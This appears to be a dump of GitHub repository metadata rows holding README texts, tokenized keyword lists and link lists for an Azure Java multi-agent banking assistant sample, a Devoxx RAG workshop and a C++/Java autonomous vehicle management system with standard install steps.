[Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general).
Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.
Any use of third-party trademarks or logos are subject to those third-party's policies.
",0,1,2,mit,2.0,"['sample', 'language', 'azdeveloper', 'java', 'bicep', 'typescript', 'html', 'product', 'azure', 'github', 'urlfragment', 'name', 'multi', 'agent', 'banking', 'assistant', 'java', 'semantic', 'kernel', 'description', 'java', 'sample', 'app', 'emulating', 'personal', 'banking', 'assistant', 'inquire', 'account', 'balance', 'review', 'recent', 'transaction', 'initiate', 'payment', 'multi', 'agent', 'banking', 'assistant', 'java', 'semantic', 'kernel', 'star', 'like', 'sample', 'star', 'github', 'help', 'lot', 'overview', 'architecture', 'get', 'started', 'resources', 'faq', 'troubleshooting', 'project', 'designed', 'proof', 'concept', 'poc', 'explore', 'innovative', 'realm', 'generative', 'ai', 'within', 'context', 'architecture', 'leveraging', 'java', 'microsoft', 'semantic', 'kernel', 'ai', 'orchestration', 'framework', 'aim', 'build', 'chat', 'web', 'app', 'demonstrate', 'feasibility', 'reliability', 'using', 'generative', 'ai', 'agent', 'transform', 'user', 'experience', 'web', 'click', 'natural', 'language', 'conversation', 'maximizing', 'reuse', 'existing', 'workload', 'data', 'apis', 'overview', 'core', 'use', 'case', 'proof', 'concept', 'poc', 'revolves', 'around', 'banking', 'personal', 'assistant', 'designed', 'revolutionize', 'way', 'user', 'interact', 'bank', 'account', 'information', 'transaction', 'history', 'payment', 'functionality', 'utilizing', 'power', 'generative', 'ai', 'within', 'architecture', 'assistant', 'aim', 'provide', 'seamless', 'conversational', 'interface', 'user', 'effortlessly', 'access', 'manage', 'financial', 'data', 'instead', 'navigating', 'traditional', 'web', 'interface', 'menu', 'user', 'simply', 'converse', 'assistant', 'inquire', 'account', 'balance', 'review', 'recent', 'transaction', 'initiate', 'payment', 'approach', 'enhances', 'user', 'experience', 'making', 'financial', 'management', 'intuitive', 'accessible', 'also', 'leverage', 'existing', 'workload', 'data', 'apis', 'ensure', 'reliable', 'secure', 'service', 'invoice', 'sample', 'included', 'data', 'folder', 'make', 'easy', 'explore', 'payment', 'feature', 'payment', 'agent', 'equipped', 'ocr', 'tool', 'azure', 'document', 'intelligence', 'lead', 'conversation', 'user', 'extract', 'invoice', 'data', 'initiate', 'payment', 'process', 'account', 'fake', 'data', 'transaction', 'payment', 'method', 'account', 'balance', 'also', 'available', 'queried', 'user', 'data', 'service', 'exposed', 'external', 'rest', 'apis', 'consumed', 'agent', 'provide', 'user', 'requested', 'information', 'feature', 'project', 'provides', 'following', 'feature', 'technical', 'pattern', 'simple', 'multi', 'ai', 'agent', 'java', 'implementation', 'using', 'azure', 'open', 'ai', 'chat', 'intent', 'extraction', 'agent', 'routing', 'agent', 'tool', 'configuration', 'automatic', 'tool', 'invocation', 'java', 'semantic', 'kernel', 'tool', 'output', 'cache', 'scoped', 'chat', 'conversation', 'improves', 'function', 'call', 'planning', 'parameter', 'extraction', 'long', 'chat', 'chat', 'based', 'conversation', 'implemented', 'react', 'single', 'page', 'application', 'support', 'image', 'image', 'invoice', 'receipt', 'bill', 'file', 'want', 'virtual', 'banking', 'assistant', 'pay', 'behalf', 'image', 'scanning', 'data', 'extraction', 'azure', 'document', 'intelligence', 'using', 'model', 'import', 'rest', 'api', 'contract', 'openapi', 'yaml', 'file', 'agent', 'tool', 'providing', 'automatic', 'rest', 'client', 'call', 'us', 'code', 'java', 'semantic', 'kernel', 'code', 'sample', 'add', 'copilot', 'app', 'existing', 'business', 'microservices', 'hosted', 'azure', 'container', 'apps', 'automated', 'azure', 'resource', 'creation', 'solution', 'deployment', 'leveraging', 'azure', 'developer', 'cli', 'complex', 'agent', 'conversation', 'implementation', 'read', 'autogen', 'framework', 'architecture', 'personal', 'banking', 'assistant', 'designed', 'vertical', 'system', 'agent', 'specializing', 'specific', 'functional', 'domain', 'account', 'management', 'transaction', 'history', 'payment', 'architecture', 'consists', 'following', 'key', 'component', 'copilot', 'assistant', 'copilot', 'app', 'microservice', 'serf', 'central', 'hub', 'processing', 'user', 'request', 'spring', 'boot', 'application', 'implementing', 'vertical', 'architecture', 'using', 'java', 'semantic', 'kernel', 'create', 'agent', 'equipped', 'tool', 'java', 'agent', 'router', 'understand', 'user', 'intent', 'chat', 'interaction', 'route', 'request', 'appropriate', 'agent', 'agent', 'router', 'act', 'user', 'proxy', 'interpreting', 'user', 'intent', 'based', 'chat', 'input', 'directing', 'request', 'specific', 'domain', 'agent', 'component', 'ensures', 'user', 'query', 'efficiently', 'handled', 'relevant', 'agent', 'us', 'intentextractor', 'tool', 'backed', 'model', 'extract', 'user', 'intent', 'json', 'format', 'intent', 'clarifying', 'question', 'provided', 'account', 'agent', 'specializes', 'handling', 'task', 'related', 'banking', 'account', 'information', 'credit', 'balance', 'registered', 'payment', 'method', 'leverage', 'specific', 'account', 'service', 'apis', 'fetch', 'manage', 'data', 'semantic', 'kernel', 'http', 'plugin', 'used', 'create', 'tool', 'definition', 'rest', 'api', 'yaml', 'contract', 'open', 'api', 'specification', 'automatically', 'call', 'http', 'endpoint', 'input', 'parameter', 'extracted', 'model', 'chat', 'conversation', 'transaction', 'agent', 'focus', 'task', 'related', 'querying', 'user', 'bank', 'movement', 'including', 'income', 'outcome', 'payment', 'agent', 'access', 'account', 'api', 'retrieve', 'accountid', 'transaction', 'history', 'service', 'search', 'transaction', 'present', 'user', 'payment', 'agent', 'dedicated', 'managing', 'task', 'related', 'submitting', 'payment', 'interacts', 'multiple', 'apis', 'tool', 'scaninvoice', 'backed', 'azure', 'document', 'intelligence', 'account', 'service', 'retrieve', 'account', 'payment', 'method', 'info', 'payment', 'service', 'submit', 'payment', 'processing', 'transaction', 'history', 'service', 'check', 'previous', 'paid', 'invoice', 'existing', 'business', 'apis', 'interface', 'backend', 'system', 'perform', 'operation', 'related', 'personal', 'banking', 'account', 'transaction', 'invoice', 'payment', 'apis', 'implemented', 'external', 'spring', 'boot', 'microservices', 'providing', 'necessary', 'data', 'functionality', 'consumed', 'agent', 'execute', 'task', 'account', 'service', 'microservice', 'provides', 'functionality', 'like', 'retrieving', 'account', 'detail', 'username', 'fetching', 'payment', 'method', 'getting', 'registered', 'beneficiary', 'microservice', 'support', 'agent', 'payment', 'service', 'microservice', 'offer', 'capability', 'submit', 'payment', 'notify', 'transaction', 'critical', 'component', 'payment', 'agent', 'execute', 'task', 'efficiently', 'reporting', 'service', 'microservice', 'enables', 'searching', 'transaction', 'retrieving', 'transaction', 'recipient', 'service', 'support', 'transaction', 'agent', 'providing', 'detailed', 'transaction', 'report', 'user', 'payment', 'agent', 'need', 'check', 'invoice', 'already', 'paid', 'getting', 'started', 'run', 'github', 'codespaces', 'vs', 'code', 'dev', 'container', 'run', 'repo', 'virtually', 'using', 'github', 'codespaces', 'vs', 'code', 'dev', 'container', 'click', 'one', 'button', 'open', 'repo', 'one', 'option', 'prerequisite', 'already', 'installed', 'container', 'skip', 'starting', 'scratch', 'section', 'prerequisite', 'java', 'maven', 'azure', 'developer', 'cli', 'git', 'powershell', 'pwsh', 'window', 'user', 'important', 'ensure', 'run', 'powershell', 'command', 'fails', 'likely', 'need', 'upgrade', 'powershell', 'warning', 'azure', 'account', 'must', 'permission', 'user', 'access', 'administrator', 'owner', 'starting', 'scratch', 'clone', 'repo', 'change', 'directory', 'root', 'repo', 'run', 'project', 'available', 'locally', 'run', 'following', 'command', 'azure', 'service', 'want', 'start', 'fresh', 'deployment', 'run', 'run', 'provision', 'azure', 'resource', 'deploy', 'sample', 'resource', 'project', 'tested', 'model', 'currently', 'available', 'region', 'eastus', 'default', 'swedencentral', 'list', 'region', 'model', 'check', 'azure', 'document', 'intelligence', 'new', 'rest', 'api', 'used', 'currently', 'available', 'region', 'eastus', 'default', 'westeurope', 'info', 'application', 'successfully', 'deployed', 'see', 'web', 'app', 'url', 'printed', 'console', 'click', 'url', 'interact', 'application', 'browser', 'look', 'like', 'following', 'deploying', 'existing', 'azure', 'resource', 'already', 'existing', 'azure', 'resource', 'setting', 'environment', 'value', 'existing', 'resource', 'group', 'run', 'run', 'existing', 'openai', 'resource', 'run', 'run', 'run', 'needed', 'openai', 'resource', 'different', 'location', 'one', 'pick', 'step', 'run', 'needed', 'chatgpt', 'deployment', 'default', 'existing', 'azure', 'document', 'intelligence', 'run', 'run', 'resource', 'group', 'different', 'location', 'one', 'pick', 'step', 'run', 'existing', 'azure', 'resource', 'also', 'use', 'existing', 'form', 'recognizer', 'storage', 'account', 'see', 'list', 'environment', 'variable', 'pas', 'configure', 'existing', 'resource', 'provision', 'remaining', 'resource', 'run', 'following', 'step', 'deploying', 'scratch', 'provision', 'resource', 'deploy', 'code', 'redeploying', 'changed', 'code', 'folder', 'need', 'azure', 'resource', 'run', 'changed', 'infrastructure', 'file', 'folder', 'need', 'azure', 'resource', 'running', 'warning', 'run', 'multiple', 'time', 'redeploy', 'infrastructure', 'make', 'sure', 'set', 'following', 'parameter', 'avoid', 'container', 'apps', 'image', 'overridden', 'default', 'image', 'running', 'locally', 'run', 'change', 'dir', 'run', 'window', 'script', 'run', 'vs', 'code', 'task', 'start', 'app', 'start', 'project', 'locally', 'wait', 'docker', 'compose', 'start', 'container', 'web', 'api', 'indexer', 'refresh', 'browser', 'http', 'guidance', 'testing', 'different', 'model', 'version', 'default', 'llm', 'used', 'project', 'small', 'model', 'enhanced', 'planning', 'reasoning', 'capability', 'required', 'use', 'case', 'reliably', 'select', 'right', 'agent', 'based', 'chat', 'conversation', 'properly', 'handle', 'tool', 'case', 'long', 'chat', 'word', 'model', 'might', 'fail', 'sometimes', 'detect', 'right', 'user', 'intent', 'especially', 'asks', 'pay', 'bill', 'based', 'image', 'upload', 'based', 'test', 'provides', 'better', 'result', 'expensive', 'slower', 'read', 'model', 'price', 'check', 'test', 'different', 'model', 'version', 'changing', 'environment', 'variable', 'desired', 'model', 'like', 'enabling', 'application', 'insight', 'application', 'insight', 'enabled', 'default', 'allows', 'investigate', 'request', 'tracing', 'along', 'logging', 'error', 'want', 'disable', 'set', 'variable', 'false', 'running', 'run', 'run', 'see', 'performance', 'data', 'go', 'application', 'insight', 'resource', 'resource', 'group', 'click', 'investigate', 'performance', 'blade', 'navigate', 'http', 'request', 'see', 'timing', 'data', 'inspect', 'performance', 'chat', 'request', 'use', 'drill', 'sample', 'button', 'see', 'trace', 'api', 'call', 'made', 'chat', 'request', 'trace', 'event', 'panel', 'review', 'custom', 'java', 'informational', 'log', 'better', 'understand', 'content', 'openai', 'request', 'response', 'see', 'exception', 'server', 'error', 'navigate', 'investigate', 'failure', 'blade', 'use', 'filtering', 'tool', 'locate', 'specific', 'exception', 'see', 'java', 'stack', 'trace', 'side', 'enabling', 'authentication', 'default', 'web', 'app', 'aca', 'authentication', 'access', 'restriction', 'enabled', 'meaning', 'anyone', 'routable', 'network', 'access', 'web', 'app', 'chat', 'personal', 'require', 'authentication', 'microsoft', 'entra', 'following', 'add', 'app', 'authentication', 'tutorial', 'set', 'deployed', 'web', 'app', 'limit', 'access', 'specific', 'set', 'user', 'group', 'follow', 'step', 'restrict', 'microsoft', 'entra', 'app', 'set', 'user', 'changing', 'assignment', 'required', 'option', 'enterprise', 'application', 'assigning', 'access', 'user', 'granted', 'explicit', 'access', 'receive', 'error', 'message', 'administrator', 'configured', 'application', 'block', 'user', 'app', 'continuous', 'integration', 'github', 'action', 'create', 'service', 'principal', 'github', 'action', 'pipeline', 'use', 'az', 'ad', 'sp', 'create', 'service', 'principal', 'output', 'similar', 'save', 'json', 'output', 'used', 'later', 'step', 'also', 'take', 'note', 'clientid', 'need', 'update', 'service', 'principal', 'next', 'section', 'assign', 'acrpush', 'permission', 'service', 'principal', 'step', 'enables', 'github', 'workflow', 'use', 'service', 'principal', 'authenticate', 'container', 'registry', 'push', 'docker', 'image', 'get', 'resource', 'id', 'container', 'registry', 'substitute', 'name', 'registry', 'following', 'az', 'acr', 'show', 'command', 'use', 'az', 'role', 'assignment', 'create', 'assign', 'acrpush', 'role', 'give', 'push', 'pull', 'access', 'registry', 'substitute', 'client', 'id', 'service', 'principal', 'add', 'service', 'principal', 'github', 'environment', 'secret', 'go', 'forked', 'repository', 'github', 'create', 'environment', 'called', 'yes', 'exact', 'name', 'change', 'want', 'change', 'environment', 'name', 'also', 'adding', 'new', 'branch', 'environment', 'change', 'current', 'mapping', 'make', 'sure', 'change', 'pipeline', 'code', 'accordingly', 'create', 'environment', 'secret', 'secret', 'value', 'entire', 'json', 'output', 'service', 'principal', 'creation', 'step', 'service', 'principal', 'client', 'id', 'used', 'username', 'login', 'azure', 'container', 'registry', 'service', 'principal', 'client', 'secret', 'used', 'password', 'login', 'azure', 'container', 'registry', 'create', 'environment', 'variable', 'variable', 'value', 'name', 'azure', 'container', 'registry', 'name', 'resource', 'group', 'azure', 'container', 'environment', 'deployed', 'create', 'repository', 'variable', 'variable', 'value', 'name', 'azure', 'container', 'apps', 'environment', 'container', 'app', 'name', 'copilot', 'orchestrator', 'app', 'container', 'app', 'name', 'web', 'frontend', 'app', 'container', 'app', 'name', 'business', 'account', 'api', 'container', 'app', 'name', 'business', 'payment', 'api', 'container', 'app', 'name', 'business', 'payment', 'api', 'cost', 'estimation', 'pricing', 'varies', 'per', 'region', 'usage', 'possible', 'predict', 'exact', 'cost', 'usage', 'however', 'try', 'azure', 'pricing', 'calculator', 'resource', 'azure', 'container', 'app', 'consumption', 'workload', 'profile', 'cpu', 'core', 'gb', 'ram', 'pricing', 'per', 'vcpu', 'memory', 'pricing', 'azure', 'openai', 'standard', 'tier', 'chatgpt', 'ada', 'model', 'pricing', 'per', 'token', 'used', 'least', 'token', 'used', 'per', 'question', 'pricing', 'azure', 'document', 'intelligence', 'standard', 'tier', 'using', 'layout', 'pricing', 'azure', 'blob', 'storage', 'standard', 'tier', 'zr', 'storage', 'pricing', 'per', 'storage', 'read', 'operation', 'pricing', 'azure', 'monitor', 'tier', 'cost', 'based', 'data', 'ingested', 'pricing', 'first', 'million', 'request', 'month', 'free', 'aca', 'reduce', 'cost', 'switch', 'free', 'skus', 'document', 'intelligence', 'changing', 'parameter', 'file', 'folder', 'limit', 'consider', 'example', 'free', 'resource', 'analyzes', 'first', 'page', 'document', 'avoid', 'unnecessary', 'cost', 'remember', 'take', 'app', 'longer', 'use', 'either', 'deleting', 'resource', 'group', 'portal', 'running', 'resources', 'resource', 'learn', 'architecture', 'technology', 'used', 'sample', 'generative', 'ai', 'beginner', 'azure', 'openai', 'service', 'semantic', 'kernel', 'java', 'openai', 'bet', 'cognitive', 'architecture', 'landscape', 'emerging', 'ai', 'agent', 'architecture', 'reasoning', 'planning', 'tool', 'calling', 'survey', 'microagents', 'exploring', 'agentic', 'architecture', 'microservices', 'chat', 'enterprise', 'data', 'azure', 'openai', 'azure', 'ai', 'search', 'sk', 'agent', 'overview', 'high', 'level', 'design', 'also', 'find', 'azure', 'ai', 'sample', 'faq', 'find', 'answer', 'frequently', 'asked', 'question', 'faq', 'troubleshooting', 'issue', 'running', 'deploying', 'sample', 'please', 'check', 'troubleshooting', 'guide', 'ca', 'find', 'solution', 'problem', 'please', 'open', 'issue', 'repository', 'contributing', 'project', 'welcome', 'contribution', 'suggestion', 'contribution', 'require', 'agree', 'contributor', 'license', 'agreement', 'cla', 'declaring', 'right', 'actually', 'grant', 'u', 'right', 'use', 'contribution', 'detail', 'visit', 'http', 'submit', 'pull', 'request', 'cla', 'bot', 'automatically', 'determine', 'whether', 'need', 'provide', 'cla', 'decorate', 'pr', 'appropriately', 'status', 'check', 'comment', 'simply', 'follow', 'instruction', 'provided', 'bot', 'need', 'across', 'repos', 'using', 'cla', 'project', 'adopted', 'microsoft', 'open', 'source', 'code', 'conduct', 'information', 'see', 'code', 'conduct', 'faq', 'contact', 'opencode', 'additional', 'question', 'comment', 'trademark', 'project', 'may', 'contain', 'trademark', 'logo', 'project', 'product', 'service', 'authorized', 'use', 'microsoft', 'trademark', 'logo', 'subject', 'must', 'follow', 'microsoft', 'trademark', 'brand', 'guideline', 'use', 'microsoft', 'trademark', 'logo', 'modified', 'version', 'project', 'must', 'cause', 'confusion', 'imply', 'microsoft', 'sponsorship', 'use', 'trademark', 'logo', 'subject', 'policy']","['azure', 'agent', 'user', 'service', 'run']",1,24,0,"['multi', 'agent', 'bank', 'assistant', 'java', 'semantic', 'kernel', 'overview', 'feature', 'architecture', 'get', 'start', 'run', 'github', 'codespaces', 'v', 'code', 'dev', 'container', 'prerequisite', 'start', 'scratch', 'deploy', 'exist', 'azure', 'resource', 'exist', 'resource', 'group', 'exist', 'openai', 'resource', 'exist', 'azure', 'document', 'intelligence', 'other', 'exist', 'azure', 'resource', 'provision', 'remain', 'resource', 'redeploy', 'run', 'locally', 'guidance', 'test', 'different', 'model', 'version', 'enable', 'application', 'insight', 'enable', 'authentication', 'app', 'continuous', 'integration', 'github', 'action', 'cost', 'estimation', 'resource', 'faq', 'troubleshoot', 'contribute', 'trademark']",27,"['resource', 'exist', 'azure', 'start', 'run']",12,0.0,6.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.spotbugs:spotbugs-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.codehaus.mojo:animal-sniffer-maven-plugin,org.codehaus.mojo:exec-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,5.0,1.0,28903,25.227848101265824,5.448319116909183,"['![Open project in GitHub Codespaces -> https://img.shields.io/badge/Codespaces-Open-blue?style=flat-square&logo=github', '![Build Status -> https://img.shields.io/github/actions/workflow/status/azure-samples/agent-openai-java-banking-assistant/azure-dev.yaml?style=flat-square&label=Build', 'Java version -> https://img.shields.io/badge/Java->=17-3c873a?style=flat-square', '![License -> https://img.shields.io/badge/License-MIT-yellow?style=flat-square', '![Watch how to use this sample on YouTube -> https://img.shields.io/badge/YouTube-Watch-d95652.svg?style=flat-square&logo=youtube', 'Java Semantic Kernel -> https://github.com/microsoft/semantic-kernel-java/', 'React Single Page Application -> https://react.fluentui.dev/?path=/docs/concepts-introduction--docs', 'prebuilt-invoice -> https://learn.microsoft.com/en-us/azure/ai-services/document-intelligence/concept-invoice?view=doc-intel-4.0.0', 'open-api-plugin code sample -> https://github.com/microsoft/semantic-kernel-java/tree/main/samples/semantickernel-sample-plugins/semantickernel-openapi-plugin', 'Azure Container Apps -> https://azure.microsoft.com/en-us/products/container-apps', 'Azure Developer CLI -> https://learn.microsoft.com/en-us/azure/developer/azure-developer-cli/', 'Autogen framework -> https://github.com/microsoft/autogen', '![Open in GitHub Codespaces -> https://img.shields.io/static/v1?style=for-the-badge&label=GitHub+Codespaces&message=Open&color=brightgreen&logo=github', '![Open in VS Code Dev Containers -> https://img.shields.io/static/v1?style=for-the-badge&label=Remote%20-%20Containers&message=Open&color=blue&logo=visualstudiocode', 'Java 17 -> https://learn.microsoft.com/en-us/java/openjdk/download#openjdk-17', 'Maven 3.8.x -> https://maven.apache.org/download.cgi', 'Azure Developer CLI -> https://aka.ms/azure-dev/install', 'Node.js -> https://nodejs.org/en/download/', 'Git -> https://git-scm.com/downloads', 'Powershell 7+ (pwsh) -> https://github.com/powershell/powershell', '!WARNING] Your Azure Account must have `Microsoft.Authorization/roleAssignments/write` permissions, such as [User Access Administrator -> https://learn.microsoft.com/azure/role-based-access-control/built-in-roles#user-access-administrator', 'Owner -> https://learn.microsoft.com/azure/role-based-access-control/built-in-roles#owner', 'here -> https://learn.microsoft.com/en-us/azure/ai-services/openai/concepts/models', 'here -> https://learn.microsoft.com/en-us/azure/ai-services/document-intelligence/sdk-overview-v4-0?view=doc-intel-4.0.0&tabs=csharp', 'http://localhost -> http://localhost', 'here -> https://azure.microsoft.com/en-us/pricing/details/cognitive-services/openai-service/', 'Add app authentication -> https://learn.microsoft.com/en-us/azure/container-apps/authentication', 'Restrict your Microsoft Entra app to a set of users -> https://learn.microsoft.com/entra/identity-platform/howto-restrict-your-app-to-a-set-of-users', 'az ad sp create-for-rbac -> https://learn.microsoft.com/en-us/cli/azure/ad/sp#az_ad_sp_create_for_rbac', 'authenticate with your container registry -> https://learn.microsoft.com/en-us/azure/container-registry/container-registry-auth-service-principal', 'az role assignment create -> https://learn.microsoft.com/en-us/cli/azure/role/assignment#az_role_assignment_create', 'secrets -> https://docs.github.com/en/actions/security-guides/encrypted-secrets#creating-encrypted-secrets-for-a-repository', 'environment variables -> https://docs.github.com/en/actions/learn-github-actions/variables#creating-configuration-variables-for-an-environment', 'repository variables -> https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables#creating-configuration-variables-for-a-repository', 'Azure pricing calculator -> https://azure.com/e/8ffbe5b1919c4c72aed89b022294df76', 'Pricing -> https://azure.microsoft.com/en-us/pricing/details/container-apps/', 'Pricing -> https://azure.microsoft.com/en-us/pricing/details/cognitive-services/openai-service/', 'Pricing -> https://azure.microsoft.com/pricing/details/form-recognizer/', 'Pricing -> https://azure.microsoft.com/pricing/details/storage/blobs/', 'Pricing -> https://azure.microsoft.com/pricing/details/monitor/', 'Generative AI For Beginners -> https://github.com/microsoft/generative-ai-for-beginners', 'Azure OpenAI Service -> https://learn.microsoft.com/azure/ai-services/openai/overview', 'Semantic Kernel for Java -> https://devblogs.microsoft.com/semantic-kernel/java-1-0-release-candidate-for-semantic-kernel-now-available/', ""OpenAI's Bet on a Cognitive Architecture -> https://blog.langchain.dev/openais-bet-on-a-cognitive-architecture/"", 'THE LANDSCAPE OF EMERGING AI AGENT ARCHITECTURES FOR REASONING, PLANNING, AND TOOL CALLING: A SURVEY -> https://arxiv.org/pdf/2404.11584', 'MicroAgents: Exploring Agentic Architecture with Microservices -> https://devblogs.microsoft.com/semantic-kernel/microagents-exploring-agentic-architecture-with-microservices/', 'Chat + Enterprise data with Azure OpenAI and Azure AI Search -> https://github.com/Azure-Samples/azure-search-openai-java', 'SK Agents Overview and High Level Design (.net) -> https://github.com/microsoft/semantic-kernel/blob/ec26ce7cb70f933b52a62f0a4e1c7b98c49d590e/docs/decisions/0032-agents.md#usage-patterns', 'more Azure AI samples here -> https://github.com/Azure-Samples/azureai-samples', ""troubleshooting guide](./docs/troubleshooting.md). If you can't find a solution to your problem, please [open an issue -> https://github.com/Azure-Samples/agent-openai-java-banking-assistant/issues"", 'Microsoft Open Source Code of Conduct -> https://opensource.microsoft.com/codeofconduct/', 'Code of Conduct FAQ -> https://opensource.microsoft.com/codeofconduct/faq/', ""Microsoft's Trademark & Brand Guidelines -> https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general""]",53
datastaxdevs/conference-2024-devoxx,main,"## 🧑🏻‍💻 🧑🏾‍💻 From naive to advanced RAG: The complete guide 👩🏿‍💻 👩‍💻

[![License Apache2](https://img.shields.io/hexpm/l/plug.svg)](http://www.apache.org/licenses/LICENSE-2.0)
![Java](https://img.shields.io/badge/Java-17%20&%20GraalVM-00CC00?style=flat)

ℹ️ **About this Session**

> It’s easy to get started with Retrieval Augmented Generation, but you’ll quickly be disappointed with the generated answers: inaccurate or incomplete, missing context or outdated information, bad text chunking strategy, not the best documents returned by your vector database, and the list goes on.

> After meeting thousands of developers across Europe, we’ve explored those pain points, and will share with you how to overcome them. As part of the team building a vector database we are aware of the different flavors of searches (semantic, meta-data, full text, multimodal) and embedding model choices. We have been implementing RAG pipelines across different projects and frameworks and are contributing to LangChain4j.

> In this deep-dive, we will examine various techniques using LangChain4j to bring your RAG to the next level: with semantic chunking, query expansion & compression, metadata filtering, document reranking, data lifecycle processes, and how to best evaluate and present the results to your users.

⏲️ **Duration :** `3 hours`

🎓 **Level** `Intermediate`

![](img/splash.png)

## 📋 Table of Demos

",0,0,1,apache-2.0,0.0,"['naive', 'advanced', 'rag', 'complete', 'guide', 'session', 'easy', 'get', 'started', 'retrieval', 'augmented', 'generation', 'quickly', 'disappointed', 'generated', 'answer', 'inaccurate', 'incomplete', 'missing', 'context', 'outdated', 'information', 'bad', 'text', 'chunking', 'strategy', 'best', 'document', 'returned', 'vector', 'database', 'list', 'go', 'meeting', 'thousand', 'developer', 'across', 'europe', 'explored', 'pain', 'point', 'share', 'overcome', 'part', 'team', 'building', 'vector', 'database', 'aware', 'different', 'flavor', 'search', 'semantic', 'full', 'text', 'multimodal', 'embedding', 'model', 'choice', 'implementing', 'rag', 'pipeline', 'across', 'different', 'project', 'framework', 'contributing', 'examine', 'various', 'technique', 'using', 'bring', 'rag', 'next', 'level', 'semantic', 'chunking', 'query', 'expansion', 'compression', 'metadata', 'filtering', 'document', 'reranking', 'data', 'lifecycle', 'process', 'best', 'evaluate', 'present', 'result', 'user', 'duration', 'level', 'table', 'demo']","['rag', 'text', 'chunking', 'best', 'document']",0,0,0,"['from', 'naive', 'advance', 'rag', 'the', 'complete', 'guide', 'table', 'demo']",2,"['from', 'naive', 'advance', 'rag', 'the']",0,0.0,1.0,[org.apache.maven.plugins:maven-compiler-plugin],0.0,1.0,0.0,1405,23.33333333333333,5.128571428571429,"['![License Apache2 -> https://img.shields.io/hexpm/l/plug.svg', 'Java -> https://img.shields.io/badge/Java-17%20&%20GraalVM-00CC00?style=flat']",2
Erio-Harrison/SAVMS,master,"# Smart Autonomous Vehicle Management System

![Architecture](./asset/architecture.png)

## Table of Contents
- [Installation](#installation)
  - [Prerequisites](#prerequisites)
  - [Building the Core Library](#building-the-core-library)
  - [Setting up the Frontend](#setting-up-the-frontend)
    - [Windows](#windows)
    - [Ubuntu](#ubuntu)
  - [Setting up the Backend](#setting-up-the-backend)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)

## Installation

This project uses C++ for core algorithms and high-performance computing, and Java for application layer development.

### Prerequisites

Before installation, ensure you have the following installed:

1. MySQL (Community Edition)
   - Download and install from: https://dev.mysql.com/downloads/
   - Set a password for the root user
   - For a demo, see: https://www.bilibili.com/video/BV1Kr4y1i7ru?p=3

2. Node.js
   - Download and install from: https://nodejs.org/
   - Verify installation with: `node -v` and `npm -v`

3. CMake
   - Download and install from: https://github.com/Kitware/CMake/releases/
   - Add CMake to the system PATH
   - For a demo, see: https://www.bilibili.com/video/BV1DV411k7PA?p=1

4. MinGW (for Windows)
   - Download and extract from: https://github.com/niXman/mingw-builds-binaries/releases/
   - Add to the system PATH: `#\mingw64\bin`
   - Verify installation with: `gcc -v`
   - For a demo, see: https://www.bilibili.com/video/BV1bC411474b/

### Building the Core Library

To build the core C++ library:

```bash
cd engine
mkdir build
cd build
cmake ..
make
```

This will generate a shared library named:
- `libdataprocessing.so` (Linux)
- `libdataprocessing.dll` (Windows)
- `libdataprocessing.dylib` (Mac)

### Setting up the Frontend

#### Windows

1. Navigate to the `frontend` directory
2. If you encounter issues with vite, delete `package-lock.json` and reinstall dependencies:
   ```bash
   npm install
   ```
3. Run the development server:
   ```bash
   npm run dev
   ```

#### Ubuntu

1. Install nvm:
   ```bash
   curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash
   ```

2. Reload the shell configuration:
   ```bash
   source ~/.bashrc
   ```

3. Install the latest LTS version of Node.js:
   ```bash
   nvm install --lts
   ```

4. Use the newly installed Node.js:
   ```bash
   nvm use --lts
   ```

5. Add Yarn's official repository and install the latest version:
   ```bash
   curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add -
   echo ""deb https://dl.yarnpkg.com/debian/ stable main"" | sudo tee /etc/apt/sources.list.d/yarn.list
   sudo apt update
   sudo apt install yarn
   ```

6. Navigate to the frontend directory and install dependencies:
   ```bash
   cd frontend
   yarn install
   ```

7. Run the development server:
   ```bash
   yarn dev
   ```

### Setting up the Backend

1. Navigate to the `engine` directory
2. Check the `CMakeLists.txt` file and ensure file directories are correct
3. Build the project:
   ```bash
   mkdir build
   cd build
   cmake -G ""MinGW Makefiles"" ..
   mingw32-make
   ```

## Usage

After installing all the necessary components:

1. Run the application's main function.
2. Start the frontend interface.
3. The system is now ready to accept network connections from client devices.

## Contributing

To contribute to this project:

1. Submit your code changes.
2. Create a pull request.
3. Wait for the review process to complete.

## License

This project is licensed under the Apache License, Version 2.0. You may obtain a copy of the License at:

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.
",0,14,7,apache-2.0,12.0,"['smart', 'autonomous', 'vehicle', 'management', 'system', 'table', 'content', 'installation', 'prerequisite', 'building', 'core', 'library', 'setting', 'frontend', 'window', 'ubuntu', 'setting', 'backend', 'usage', 'contributing', 'license', 'installation', 'project', 'us', 'core', 'algorithm', 'computing', 'java', 'application', 'layer', 'development', 'prerequisite', 'installation', 'ensure', 'following', 'installed', 'mysql', 'community', 'edition', 'download', 'install', 'http', 'set', 'password', 'root', 'user', 'demo', 'see', 'http', 'download', 'install', 'http', 'verify', 'installation', 'cmake', 'download', 'install', 'http', 'add', 'cmake', 'system', 'path', 'demo', 'see', 'http', 'mingw', 'window', 'download', 'extract', 'http', 'add', 'system', 'path', 'verify', 'installation', 'demo', 'see', 'http', 'building', 'core', 'library', 'build', 'core', 'library', 'generate', 'shared', 'library', 'named', 'linux', 'window', 'mac', 'setting', 'frontend', 'window', 'navigate', 'directory', 'encounter', 'issue', 'vite', 'delete', 'reinstall', 'dependency', 'run', 'development', 'server', 'ubuntu', 'install', 'nvm', 'reload', 'shell', 'configuration', 'install', 'latest', 'lts', 'version', 'use', 'newly', 'installed', 'add', 'yarn', 'official', 'repository', 'install', 'latest', 'version', 'navigate', 'frontend', 'directory', 'install', 'dependency', 'run', 'development', 'server', 'setting', 'backend', 'navigate', 'directory', 'check', 